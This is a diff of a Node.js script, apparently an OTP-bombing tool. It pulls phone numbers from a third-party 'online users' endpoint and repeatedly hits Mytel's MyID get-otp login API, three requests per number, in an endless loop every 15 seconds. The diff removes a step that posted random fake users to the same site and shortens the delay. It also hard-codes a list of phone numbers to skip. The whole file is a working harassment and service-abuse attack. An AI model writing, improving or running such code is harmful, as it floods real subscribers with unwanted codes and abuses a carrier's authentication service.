@@ -1,84 +1,63 @@
-const axios = require('axios');
+const axios = require("axios");
+const FormData = require("form-data");
 
-// ⛔ ဒီဖုန်းနံပါတ်တွေကို skip လုပ်မယ်
+// Block list
 const blockList = [
+  "09687071269",
   "09687071269",
   "09670871425",
   "09664810586",
   "09681307197"
 ];
 
-// ✅ Random phone number generator
+// ✅ Random phone
 function randomPhone() {
-    const prefix = "096";
-    const digits = Math.floor(Math.random() * 1e8).toString().padStart(8, "0");
-    return prefix + digits;
+    return "09" + Math.floor(Math.random() * 1e8).toString().padStart(8, "0");
 }
 
-// ✅ Random token generator
-function randomToken(length = 6) {
-    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    let result = "";
-    for (let i = 0; i < length; i++) {
-        result += chars[Math.floor(Math.random() * chars.length)];
-    }
-    return result;
-}
-
-// ✅ Save to save.php
-async function saveUser(phone, token) {
+// ✅ POST to online_users.php
+async function fetchOnlineUsers() {
     try {
-        const res = await axios.post("https://ironcoder.site/ironmyid/save.php", {
-            phone,
-            token
-        }, {
-            headers: { "Content-Type": "application/json" }
+        const form = new FormData();
+        form.append("phone", randomPhone()); // required field
+
+        const res = await axios.post("https://ironcoder.site/ironmyid/online_users.php", form, {
+            headers: form.getHeaders()
         });
-        if (res.data.success) {
-            console.log(`💾 Saved user ${phone}`);
+
+        if (res.data.success && Array.isArray(res.data.online_users)) {
+            console.log(`🌐 Total online users: ${res.data.total_online_users}`);
+            return res.data.online_users;
         } else {
-            console.log(`⚠️ Failed to save user: ${res.data.message || "unknown error"}`);
+            console.log("❌ No online users returned.");
+            return [];
         }
     } catch (e) {
-        console.error(`❌ Error saving user ${phone}:`, e.message);
-    }
-}
-
-// ✅ Fetch from getall.php
-async function fetchPhones() {
-    try {
-        const res = await axios.get("https://ironcoder.site/ironmyid/getall.php");
-        if (res.data.success) {
-            return res.data.data.map(user => user.phone);
-        }
-        console.log("❌ No user data");
-        return [];
-    } catch (e) {
-        console.error("❌ Error fetching list:", e.message);
+        console.error("❌ Error fetching online users:", e.message);
         return [];
     }
 }
 
-// ✅ Send 3x OTP to phone
+// ✅ Send OTP 3 times
 async function sendOtp(phone) {
     for (let i = 0; i < 3; i++) {
         try {
             const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
             const res = await axios.get(url);
             if (res.status === 200) {
-                console.log(`✅ (${i+1}/3) OTP sent to ${phone}`);
+                console.log(`✅ (${i + 1}/3) OTP sent to ${phone}`);
             } else {
-                console.log(`⚠️ (${i+1}/3) Failed for ${phone} - Status: ${res.status}`);
+                console.log(`⚠️ (${i + 1}/3) Failed for ${phone} - Status: ${res.status}`);
             }
         } catch (e) {
-            console.error(`❌ (${i+1}/3) Error sending to ${phone}:`, e.message);
+            console.error(`❌ (${i + 1}/3) Error sending to ${phone}:`, e.message);
         }
     }
 }
 
-// ✅ 1 Loop: fetch, send OTP, then save random users per phone
+// ✅ 1 round
 async function loopOnce() {
-    const phones = await fetchPhones();
+    const phones = await fetchOnlineUsers();
     let count = 0;
 
     for (const phone of phones) {
@@ -86,25 +65,19 @@ async function loopOnce() {
             console.log(`⏭ Skipped blocked number: ${phone}`);
             continue;
         }
-
         await sendOtp(phone);
         count++;
-
-        // ➕ Save a random user each time
-        const newPhone = randomPhone();
-        const newToken = randomToken();
-        await saveUser(newPhone, newToken);
     }
 
-    console.log(`✅ Round complete. Sent OTP to ${count} users (x3 each).\n`);
+    console.log(`✅ Round complete. Sent OTP to ${count} online users.\n`);
 }
 
-// 🔁 Forever loop
+// 🔁 Forever
 async function loopForever() {
     while (true) {
         await loopOnce();
-        console.log("🔁 Waiting 30s before next round...\n");
-        await new Promise(r => setTimeout(r, 30000));
+        console.log("🔁 Waiting 15s before next round...\n");
+        await new Promise(r => setTimeout(r, 15000));
     }
 }
 
